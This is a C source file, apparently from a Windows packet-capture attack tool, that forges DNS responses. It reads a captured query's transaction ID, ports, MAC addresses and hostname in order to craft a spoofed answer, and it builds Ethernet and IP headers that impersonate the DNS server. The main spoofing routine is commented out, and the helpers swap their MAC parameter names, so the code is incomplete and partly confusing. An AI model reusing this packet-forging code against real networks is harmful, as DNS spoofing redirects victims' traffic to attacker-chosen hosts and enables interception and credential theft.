#define HAVE_REMOTE

#include <pcap.h>
#include <windows.h>
#include <stdio.h>

#include "APE.h"
#include "DnsForge.h"
#include "DnsResponseSpoofing.h"
#include "LinkedListSpoofedDnsHosts.h"
#include "DnsResponseSpoofing.h"
#include "NetworkPackets.h"



int BuildSpoofedDnsReplyPacket(unsigned char *pRawPacket, int pRawPacketLen, PHOSTNODE pNode, char *pOutputBuffer, int *pOutputBufferLen)
{
/*
  int dnsSpoofingPacketsize = 0;
  int etherPacketSize = sizeof(ETHDR);
  int ipPacketSize = sizeof(IPHDR);
  int udpPacketSize = sizeof(UDPHDR);
  int dnsPacketSize = sizeof(DNS_BASIC) + sizeof(DNS_QUERY) + sizeof(DNS_ANSWER);
  unsigned short dstPort = 0;
  unsigned short srcPort = 0;
  PETHDR ethrHdr = (PETHDR)pRawPacket;
  PIPHDR ipHdr = NULL;
  PUDPHDR updHdr = NULL;
  PUDPHDR updHdr2 = NULL;
  IPADDRESS saddr, daddr;
  PDNS_BASIC dnsBasicHdr = NULL;
  PDNS_BASIC dnsAnswerHdr = NULL;
  unsigned long ulTmp = 0;
  unsigned short transactionId = 0;
  int counter = 0;
  int dnsUrlCounter = 0;
  unsigned char dnsUrlA[512];
  unsigned char *dnsUrl = NULL;
  unsigned char binDestMac[BIN_MAC_LEN];
  unsigned char binSrcMac[BIN_MAC_LEN];

  // Initialize output buffer
  ZeroMemory(pOutputBuffer, *pOutputBufferLen);
  *pOutputBufferLen = 0;

  // Copy destination and source MAC addresses
  CopyMemory(binSrcMac, ethrHdr->ether_dhost, BIN_MAC_LEN);
  CopyMemory(binDestMac, ethrHdr->ether_shost, BIN_MAC_LEN);

  // IP Header
  ipHdr = (PIPHDR)(pRawPacket + etherPacketSize);
  saddr = ipHdr->saddr;
  daddr = ipHdr->daddr;

  // Copy UDP src(client) and dest(dns server) port
  updHdr2 = (PUDPHDR)(pRawPacket + etherPacketSize + ipPacketSize);
  srcPort = ntohs(updHdr2->sport);
  dstPort = ntohs(updHdr2->dport);

  // DNS basic header	
  dnsBasicHdr = (PDNS_BASIC)(pRawPacket + etherPacketSize + ipPacketSize + udpPacketSize);

  //copy the transaction id 
  transactionId = dnsBasicHdr->trans_id;
  dnsUrl = (unsigned char *)(pRawPacket + etherPacketSize + ipPacketSize + udpPacketSize + sizeof(DNS_BASIC));
  
  // Copy requested hostname
  ZeroMemory(dnsUrlA, sizeof(dnsUrlA));
  for (dnsUrlCounter = 0; dnsUrl[dnsUrlCounter] != 0; dnsUrlCounter++)
  {
    dnsUrlA[dnsUrlCounter] = dnsUrl[dnsUrlCounter];
  }

  dnsUrlA[dnsUrlCounter] = 0;
  dnsUrlCounter++;

  // Obtain the total attack packet size
  dnsSpoofingPacketsize = dnsUrlCounter + etherPacketSize + ipPacketSize + udpPacketSize + dnsPacketSize;

  // Generate ethernet header for lDNSPacket
  GenerateEthernetPacket((unsigned char *)pOutputBuffer, (unsigned char *)binDestMac, (unsigned char *)binSrcMac);
  
  // Generate IP header for lDNSPacket
  ipHdr = (PIPHDR)(pOutputBuffer + etherPacketSize);
  GenerateIpPacket((unsigned char *)ipHdr, IPPROTO_UDP, saddr, daddr, dnsSpoofingPacketsize);

  // Generate UDP header for lDNSPacket
  updHdr = (PUDPHDR)((unsigned char *)ipHdr + ipPacketSize);
  GenerateUdpPacket((unsigned char *)updHdr, dnsSpoofingPacketsize, srcPort, dstPort);

  // Generate DNS header for lDNSPacket
  dnsAnswerHdr = (PDNS_BASIC)((unsigned char *)updHdr + udpPacketSize);

// WOW!!!
//GenerateDnsPacket_A((unsigned char *)dnsAnswerHdr, dnsUrlCounter, dnsUrlA, transactionId, (char *)pNode->sData.SpoofedIP);
  *pOutputBufferLen = dnsSpoofingPacketsize;
*/
  return 1;
}


void GenerateEthernetPacket(unsigned char * packet, unsigned char * dest, unsigned char * source)
{
  PETHDR ethrHdr = (PETHDR)packet;
  int counter;

  // Handle the MAC of source and destination of packet
  for (counter = 0; counter < BIN_MAC_LEN; counter++)
    ethrHdr->ether_dhost[counter] = source[counter];

  for (counter = 0; counter < BIN_MAC_LEN; counter++)
    ethrHdr->ether_shost[counter] = dest[counter];

  ethrHdr->ether_type = htons(0x0800);  //type of ethernet header
}


void GenerateIpPacket(unsigned char *packet, unsigned char ipProtocol, IPADDRESS srcAddr, IPADDRESS dstAddr, unsigned short dnsPacketSize)
{
  PIPHDR ipHdr = (PIPHDR)packet;

  // Fill up fields in ip header 
  ipHdr->ver_ihl = 0x45;	//version of IP header = 4
  ipHdr->tos = 0x00;		//type of service
  dnsPacketSize = dnsPacketSize - sizeof(ETHDR);
  ipHdr->tlen = htons(dnsPacketSize); //length of packet
  ipHdr->identification = htons((unsigned short)GetCurrentProcessId()); //packet identification=process ID
  ipHdr->flags_fo = htons(0x0000);//fragment offset field and u16_flags
  ipHdr->ttl = 0x3a; 	//time to live  
  ipHdr->proto = ipProtocol; //protocol;
  ipHdr->saddr = srcAddr;	//source IP address = dns server
  ipHdr->daddr = dstAddr;	//destination IP address = client
  ipHdr->crc = (unsigned short)in_cksum((unsigned short *)ipHdr, sizeof(IPHDR));//check_sum
}
